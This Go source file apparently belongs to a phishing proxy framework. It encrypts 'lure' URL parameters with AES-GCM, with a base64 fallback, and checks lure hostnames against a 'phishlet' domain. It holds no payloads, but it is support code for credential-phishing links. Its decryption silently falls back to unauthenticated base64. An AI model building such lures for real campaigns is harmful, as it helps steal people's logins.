package core

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"errors"
	"io"
)

// EncryptParams encrypts custom parameters using AES-256-GCM
// If key is empty, falls back to base64 encoding for backward compatibility
func EncryptParams(params map[string]string, key string) (string, error) {
	if key == "" {
		// Fallback to base64 encoding (backward compatibility)
		return EncodeParamsBase64(params)
	}

	// Marshal params to JSON
	jsonData, err := json.Marshal(params)
	if err != nil {
		return "", err
	}

	// Create AES cipher with SHA-256 hash of key
	keyHash := sha256.Sum256([]byte(key))
	block, err := aes.NewCipher(keyHash[:])
	if err != nil {
		return "", err
	}

	// Create GCM mode
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	// Generate nonce
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return "", err
	}

	// Encrypt and seal
	ciphertext := gcm.Seal(nonce, nonce, jsonData, nil)

	// Encode to base64 URL-safe
	return base64.RawURLEncoding.EncodeToString(ciphertext), nil
}

// DecryptParams decrypts custom parameters using AES-256-GCM
// If decryption fails, attempts base64 decoding for backward compatibility
func DecryptParams(encrypted string, key string) (map[string]string, error) {
	if key == "" {
		// Fallback to base64 decoding
		return DecodeParamsBase64(encrypted)
	}

	// Decode from base64
	ciphertext, err := base64.RawURLEncoding.DecodeString(encrypted)
	if err != nil {
		// Try base64 fallback
		return DecodeParamsBase64(encrypted)
	}

	// Create AES cipher with SHA-256 hash of key
	keyHash := sha256.Sum256([]byte(key))
	block, err := aes.NewCipher(keyHash[:])
	if err != nil {
		return nil, err
	}

	// Create GCM mode
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	// Extract nonce
	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		// Try base64 fallback
		return DecodeParamsBase64(encrypted)
	}

	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]

	// Decrypt
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		// Try base64 fallback for backward compatibility
		return DecodeParamsBase64(encrypted)
	}

	// Unmarshal JSON
	var params map[string]string
	if err := json.Unmarshal(plaintext, &params); err != nil {
		return nil, err
	}

	return params, nil
}

// EncodeParamsBase64 encodes params using base64 (legacy method)
func EncodeParamsBase64(params map[string]string) (string, error) {
	jsonData, err := json.Marshal(params)
	if err != nil {
		return "", err
	}
	return base64.RawURLEncoding.EncodeToString(jsonData), nil
}

// DecodeParamsBase64 decodes params from base64 (legacy method)
func DecodeParamsBase64(encoded string) (map[string]string, error) {
	jsonData, err := base64.RawURLEncoding.DecodeString(encoded)
	if err != nil {
		return nil, err
	}

	var params map[string]string
	if err := json.Unmarshal(jsonData, &params); err != nil {
		return nil, err
	}

	return params, nil
}

// ValidateLureHostname validates that a lure hostname is compatible with phishlet hostname
// Allows: subdomain changes only, or empty subdomain (TLD-only)
func ValidateLureHostname(lureHostname string, phishletHostname string) error {
	if lureHostname == "" {
		return errors.New("lure hostname cannot be empty")
	}

	if phishletHostname == "" {
		return errors.New("phishlet hostname not configured")
	}

	// Allow exact match
	if lureHostname == phishletHostname {
		return nil
	}

	// Extract base domain from phishlet hostname
	// e.g., "accounts.phishing.com" -> "phishing.com"
	parts := splitHostname(phishletHostname)
	if len(parts) < 2 {
		return errors.New("invalid phishlet hostname format")
	}

	baseDomain := parts[len(parts)-2] + "." + parts[len(parts)-1]

	// Check if lure hostname ends with base domain
	if lureHostname == baseDomain {
		// Empty subdomain allowed (TLD-only)
		return nil
	}

	// Check if lure hostname is subdomain of base domain
	if !endsWithDomain(lureHostname, baseDomain) {
		return errors.New("lure hostname must be subdomain of phishlet base domain")
	}

	return nil
}

// Helper: split hostname into parts
func splitHostname(hostname string) []string {
	parts := []string{}
	current := ""
	for i := len(hostname) - 1; i >= 0; i-- {
		if hostname[i] == '.' {
			if current != "" {
				parts = append([]string{current}, parts...)
				current = ""
			}
		} else {
			current = string(hostname[i]) + current
		}
	}
	if current != "" {
		parts = append([]string{current}, parts...)
	}
	return parts
}

// Helper: check if hostname ends with domain
func endsWithDomain(hostname string, domain string) bool {
	if len(hostname) < len(domain) {
		return false
	}
	if hostname == domain {
		return true
	}
	suffix := hostname[len(hostname)-len(domain):]
	if suffix == domain {
		// Check for dot separator
		if len(hostname) > len(domain) && hostname[len(hostname)-len(domain)-1] == '.' {
			return true
		}
	}
	return false
}
